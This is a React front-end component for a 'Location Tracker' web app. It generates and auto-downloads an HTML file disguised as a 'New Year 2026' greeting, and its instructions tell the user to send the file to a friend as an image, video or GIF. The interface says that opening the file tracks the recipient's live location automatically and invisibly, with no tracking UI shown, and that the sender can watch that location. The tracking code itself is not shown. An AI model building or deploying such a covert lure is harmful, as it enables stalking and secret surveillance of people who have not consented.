import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import './Home.css';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001/api';

function Home() {
  const [userId, setUserId] = useState('');
  const [linkId, setLinkId] = useState('');
  const [shareableLink, setShareableLink] = useState('');
  const [mediaFileUrl, setMediaFileUrl] = useState('');
  const [downloadUrl, setDownloadUrl] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const navigate = useNavigate();

  const generateLink = async () => {
    setLoading(true);
    setError('');
    setSuccess('');
    
    try {
      const response = await axios.post(`${API_URL}/links/generate`, {
        userId: userId || 'anonymous'
      });
      
      if (response.data && response.data.success) {
        // Extract data with fallbacks
        const linkId = response.data.linkId;
        const downloadUrl = response.data.downloadUrl || response.data.download_url;
        const mediaFileUrl = response.data.mediaFileUrl || response.data.media_file_url;
        const shareableLink = response.data.shareableLink || response.data.shareable_link;
        
        // Log response for debugging
        console.log('Full server response:', JSON.stringify(response.data, null, 2));
        console.log('downloadUrl value:', downloadUrl);
        console.log('mediaFileUrl value:', mediaFileUrl);
        
        // Validate required fields
        if (!linkId) {
          setError('Error: Link ID is missing from server response');
          console.error('Missing linkId in response:', response.data);
          return;
        }
        
        // Check if downloadUrl exists in response
        if (!response.data.downloadUrl) {
          setError('Error: Download URL is missing from server response. Server may need restart.');
          console.error('Response keys:', Object.keys(response.data));
          console.error('Full response:', response.data);
          return;
        }
        
        if (!downloadUrl || downloadUrl.includes('undefined')) {
          setError('Error: Download URL is invalid. Please check server configuration.');
          console.error('Invalid downloadUrl:', downloadUrl);
          console.error('Response data:', response.data);
          return;
        }
        
        if (!mediaFileUrl || mediaFileUrl.includes('undefined')) {
          setError('Error: Media file URL is invalid. Please check server configuration.');
          console.error('Invalid mediaFileUrl:', mediaFileUrl);
          return;
        }
        
        // Set all state values
        setLinkId(linkId);
        setShareableLink(shareableLink || '');
        setMediaFileUrl(mediaFileUrl);
        setDownloadUrl(downloadUrl);
        setSuccess('✅ File generated! Downloading now...');
        
        // Automatically download the file after generation
        setTimeout(() => {
          downloadFileAutomatically(downloadUrl, linkId);
        }, 500);
      } else {
        setError('Invalid server response. Please try again.');
        console.error('Invalid response:', response.data);
      }
    } catch (err) {
      console.error('Error generating link:', err);
      if (err.response) {
        // Server responded with error
        setError(err.response.data?.error || `Server error: ${err.response.status}`);
      } else if (err.request) {
        // Request made but no response
        setError('Cannot connect to server. Please make sure the server is running on port 3001.');
      } else {
        // Something else happened
        setError(err.message || 'Failed to generate link. Please try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  const downloadFileAutomatically = async (url, linkId) => {
    if (!url || !linkId) {
      setError('Download URL or Link ID is missing');
      return;
    }

    try {
      // Fetch the file content
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error('Failed to fetch file');
      }
      
      const blob = await response.blob();
      const downloadUrl = window.URL.createObjectURL(blob);
      
      // Create a temporary link to trigger download
      const link = document.createElement('a');
      link.href = downloadUrl;
      link.download = `NewYear2026-${linkId.substring(0, 8)}.html`;
      link.style.display = 'none';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      // Clean up the object URL
      window.URL.revokeObjectURL(downloadUrl);
      
      setSuccess('✅ File downloaded successfully! Check your Downloads folder!');
      setTimeout(() => setSuccess(''), 4000);
    } catch (err) {
      console.error('Download error:', err);
      setError('Failed to download file. Please try the "Download Again" button.');
      // Fallback: open in new tab
      setTimeout(() => {
        if (url) {
          window.open(url, '_blank');
          setSuccess('✅ File opened in new tab! Right-click and "Save As" to download.');
        }
      }, 1000);
    }
  };

  const copyToClipboard = () => {
    if (mediaFileUrl && !mediaFileUrl.includes('undefined')) {
      navigator.clipboard.writeText(mediaFileUrl);
      setSuccess('Media file URL copied to clipboard!');
      setTimeout(() => setSuccess(''), 2000);
    } else {
      setError('Media file URL not available or invalid');
    }
  };

  const downloadMediaFile = async () => {
    if (downloadUrl && linkId) {
      await downloadFileAutomatically(downloadUrl, linkId);
    } else {
      setError('Download URL or Link ID not available');
    }
  };

  const viewLocations = () => {
    if (linkId) {
      navigate(`/view/${linkId}`);
    }
  };

  return (
    <div className="home-container">
      <div className="container">
        <div className="card">
          <h1>📍 Location Tracker</h1>
          <p className="subtitle">Generate a shareable media file to track live locations</p>
          
          <div className="form-group">
            <label htmlFor="userId">User ID (Optional):</label>
            <input
              id="userId"
              type="text"
              className="input"
              placeholder="Enter your user ID (optional)"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
            />
          </div>

          <button 
            className="button" 
            onClick={generateLink}
            disabled={loading}
          >
            {loading ? 'Generating...' : 'Generate Media File'}
          </button>

          {error && <div className="error-message">{error}</div>}
          {success && <div className="success-message">{success}</div>}

          {shareableLink && mediaFileUrl && (
            <div className="link-section">
              <div className="file-generated-box">
                <h3>🎉 File Generated & Downloaded!</h3>
                <p className="file-instruction">Your New Year 2026 file has been downloaded automatically. Check your Downloads folder!</p>
                <p className="file-note">📁 File Name: <strong>NewYear2026-{linkId.substring(0, 8)}.html</strong></p>
                <button className="button download-button-large" onClick={downloadMediaFile}>
                  📥 Download Again
                </button>
                <p className="file-note">💡 Share this file with your friend via WhatsApp, Email, or any messaging app</p>
              </div>
              
              <div className="file-options">
                <h4>Other Options:</h4>
                <div className="button-group">
                  <button className="button" onClick={copyToClipboard}>
                    📋 Copy Media URL
                  </button>
                  <button className="button" onClick={viewLocations}>
                    👁️ View Friend's Location
                  </button>
                </div>
              </div>
              <div className="info-box">
                <p><strong>How it works:</strong></p>
                <ol>
                  <li>Download the media file or copy the media URL</li>
                  <li>Share the file/URL with your friend (as image, video, or GIF)</li>
                  <li>When they open it, their location will be tracked automatically</li>
                  <li>They won't see any tracking UI - it's completely invisible</li>
                  <li>You can view their live location here</li>
                </ol>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default Home;

